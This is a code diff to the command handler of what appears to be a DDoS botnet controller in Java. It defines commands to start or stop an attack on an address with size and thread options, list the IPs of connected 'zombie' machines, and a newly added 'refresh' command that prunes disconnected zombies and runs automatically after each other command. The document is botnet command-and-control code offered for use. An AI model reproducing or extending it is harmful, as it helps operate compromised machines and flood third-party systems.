@@ -2,6 +2,8 @@ package org.ddos.client.command;
 
 import org.jcom.Command;
 import org.jcom.CommandData;
+import org.jcom.CommandException;
+import org.jcom.CommandExecutionListener;
 import org.jcom.CommandInterface;
 import org.jcom.CommandInterruptedException;
 import org.jcom.FlagData;
@@ -12,6 +14,19 @@ public class ClientCommands {
 	private CommandInterface commands = new CommandInterface();
 
 	public ClientCommands() {
+		commands.addCommandExecutionListener(new CommandExecutionListener() {
+			@Override
+			public void commandExecuted(Command c, CommandData d) {
+				if (!c.getBaseCommand().equals("refresh")) {
+					try {
+						commands.executeCommand("refresh");
+					} catch (CommandException e) {
+						// who gives a frick
+					}
+				}
+			}
+		});
+
 		commands.putCommand("ddos",
 				new CommandData("ddos [start|stop] <address> {-l size, -t threads}",
 						"Starts or stops an attack on address.", 2, CommandActions.getDdosAction(),
@@ -35,6 +50,9 @@ public class ClientCommands {
 		commands.putCommand("list",
 				new CommandData("list", "Gets the IP addresses of all zombies connected to the server.", 0,
 						CommandActions.getListZombiesAction()));
+		commands.putCommand("refresh",
+				new CommandData("refresh", "Removes all of the disconected zombies off of the server.", 0,
+						CommandActions.getRemoveDeadZombiesAction()));
 		commands.putCommand("help",
 				new CommandData("help", "Lists all commands and their usage.", 0,
 						CommandActions.getUniversalHelpAction()),
